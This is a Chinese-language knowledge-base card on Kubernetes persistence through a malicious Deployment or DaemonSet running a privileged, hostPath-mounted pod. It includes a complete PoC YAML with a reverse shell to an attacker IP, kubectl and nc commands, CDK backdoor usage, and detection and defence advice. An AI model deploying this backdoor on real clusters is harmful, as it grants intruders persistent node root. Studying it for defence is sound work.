---
id: cloud-k8s-workload-controller-backdoor-persistence-privileged-pod
title: K8s 持久化：恶意 Deployment/DaemonSet 由控制器保证副本重建，配合 privileged/hostPID/hostPath 后门 Pod 持续反弹节点 root shell
type: scenario
domain: cloud
path: cloud/k8s
technique: k8s-controller-workload-persistence-backdoor
tags:
- cloud
- k8s
- persistence
- deployment
- daemonset
- privileged
- hostpath
- backdoor
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V673
  verified_at: '2026-11-13T10:33:18+08:00'
  notes: 已对照原文与图59-61核对：dep.yaml 的 replicas/hostNetwork/hostPID/privileged/hostPath:/ 与反弹 shell 命令和原文一致，图61 实测 root@node1 回连；原文未演示删除 Pod 后的重建，卡内已注明该点为控制器机制推断；CDK k8s-backdoor-daemonset 用法与原文一致。未本地复跑。
url: /docs/cloud/k8s/cloud-k8s-workload-controller-backdoor-persistence-privileged-pod/
draft: false
kb_aliases:
- K8s Deployment 持久化
- DaemonSet 后门
- k8s-backdoor-daemonset
- Deployment 特性持久化
- 控制器副本重建
---

## 一句话结论

攻击者获得创建/修改工作负载的权限后，可提交一个带恶意启动命令的 Deployment（`replicas: 3`）或 DaemonSet：副本控制器会把被删除的 Pod 自动重建，DaemonSet 还会在每个节点各起一份；配合 `securityContext.privileged: true`、`hostPID: true`、`hostPath: /`，后门 Pod 可持续以宿主机 root 权限反弹 shell（原文实测 Deployment 直接弹回 `root@node1` 并可访问 `/host/home`；"删除单个 Pod 后按模板重建"为控制器机制推断，原文未演示该步）。

## 原理

- **控制器的期望状态语义**：Deployment 管理 ReplicaSet，ReplicaSet 确保任意时刻有指定数量的 Pod 副本；DaemonSet 确保每个（或指定）节点上运行一个 Pod。攻击者把恶意 Pod 模板写进 Deployment/DaemonSet 后，**删除单个 Pod 不会终止后门**——控制器发现实际副本少于期望值，会立即用同样模板重建。只有删除/修改控制器对象本身（或收回 RBAC）才能清除。
- **恶意 Pod 模板**：原文 yaml 的关键字段：
  - `replicas: 3`：三个副本同时存在，提高存活率；
  - `hostNetwork: true`、`hostPID: true`：共享宿主网络与 PID 命名空间；
  - `securityContext.privileged: true`：容器获得几乎全部 capabilities；
  - `volumeMounts/volumes: hostPath: /`：把宿主机根目录挂到 `/host`；
  - `command/args`：`bash -c "bash -i >& /dev/tcp/<attacker>/4444 0>&1"` 启动时即反弹 shell。
- **为什么最终是节点 root**：privileged + hostPath `/` + hostPID 使容器内进程可直接访问/修改宿主机文件、进入宿主命名空间；原文反弹回来的 shell `id` 为 `uid=0(root)`，提示符为 `root@node1`，且 `cd /host/home` 可看到宿主机目录。
- **DaemonSet 变体**：CDK 的 `k8s-backdoor-daemonset` 用目标 Pod 的 SA token（或匿名）连接 API Server，提交恶意 DaemonSet 镜像/命令，达到"每个节点一份、被删自动重建"的持久化效果；与 Deployment 相比覆盖面更大（全节点）。
- **为什么是持久化而非一次性**：工作负载对象是声明式的期望状态，集群的 reconciliation 循环会持续修复偏差；这是 K8s 的合法特性，被攻击者用于维持访问。

## 触发条件

- 攻击者拥有创建/更新 Deployment、DaemonSet 等 workload 的 RBAC（或通过失陷 SA/管理员凭据获得）。
- 集群准入控制未禁止 privileged、hostPID、hostPath `/`（未启用严格 PodSecurity/PSP/OPA 策略）。
- 目标节点可出网到攻击者监听端口（反弹 shell）。
- 仅限授权测试。

## 利用步骤

1. 编写恶意 Deployment yaml（原文 `dep.yaml`）：`replicas: 3`、`hostNetwork/hostPID: true`、`privileged: true`、`hostPath: / -> /host`、启动命令反弹 shell 到攻击者。
2. `kubectl create -f dep.yaml` 提交；`kubectl get pods -o wide` 可见多个副本运行。
3. 在攻击侧 `nc -lvnp 4444` 接收反弹 shell；`id` 确认 `uid=0(root)`，主机名为节点名（原文 `root@node1`）。
4. 验证持久性：删除某个 Pod 后观察 ReplicaSet 自动重建；清理时必须 `kubectl delete -f dep.yaml` 删除整个控制器对象。
5. DaemonSet 变体：`./cdk run k8s-backdoor-daemonset (default|anonymous|<sa-token-path>) <image>`，为每个节点植入后门 Pod。

## PoC

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: nginx-deploy
spec:
  replicas: 3
  selector:
    matchLabels:
      app: nginx
  template:
    metadata:
      labels:
        app: nginx
    spec:
      hostNetwork: true
      hostPID: true
      containers:
      - name: nginx
        image: nginx:1.7.9
        imagePullPolicy: IfNotPresent
        command: ["bash"]
        args: ["-c", "bash -i >& /dev/tcp/192.168.17.164/4444 0>&1"]
        securityContext:
          privileged: true
        volumeMounts:
        - mountPath: /host
          name: host-root
      volumes:
      - name: host-root
        hostPath:
          path: /
          type: Directory
```

```bash
kubectl create -f dep.yaml
# 攻击侧
nc -lvnp 4444
# uid=0(root) gid=0(root)  root@node1
```

原文实测：Deployment 创建后收到 `root@node1` 的 root shell，并可进入 `/host/home` 查看宿主机目录；`kubectl delete -f dep.yaml` 删除后门。

## 变体与关联

- 变体：DaemonSet 覆盖全节点、CronJob 定时执行（见关联卡）、StatefulSet/Job 等其它控制器同样会重建 Pod；镜像可换成正常业务镜像以降低可疑度，命令从外置配置/Secret 读取。
- 关联：[[cloud-k8s-cronjob-reverse-shell-persistence]]（CronJob 定时持久化）、[[cloud-k8s-workload-compromise-identity-expansion-privileged-pod]]（特权 Pod 用于身份扩张）、[[cloud-container-k8s-workload-config-escape]]（privileged/hostPath 逃逸原理）、[[cloud-k8s-shadow-apiserver-anonymous-persistence]]（另一种持久化控制面）。
- 边界：严格 PodSecurity/PSP 禁止 privileged/hostPath 时后门 Pod 无法创建；收回 workload 创建/更新权限并删除控制器对象才能根除。

## 检测与防御

- **防御**：严格 RBAC（谁能创建 workload 要最小化）；启用 PodSecurity Standards（baseline/restricted）或 OPA/Kyverno 禁止 privileged、hostPID、hostPath `/`；对 Deployment/DaemonSet 变更做准入审计；镜像白名单与签名校验。
- **检测**：新增的 Deployment/DaemonSet 使用 `hostNetwork/hostPID/privileged/hostPath`、启动命令含 `/dev/tcp`、`bash -i`、`nc` 等；节点上出现向同一外部 IP:PORT 的重复连接；删除 Pod 后同模板自动重建；API 审计日志中 workload create/update 事件。
- **注意**：后门的持久性来自控制器而非 Pod 本身，应急时必须删除控制器对象并检查是否存在多个副本/节点副本。
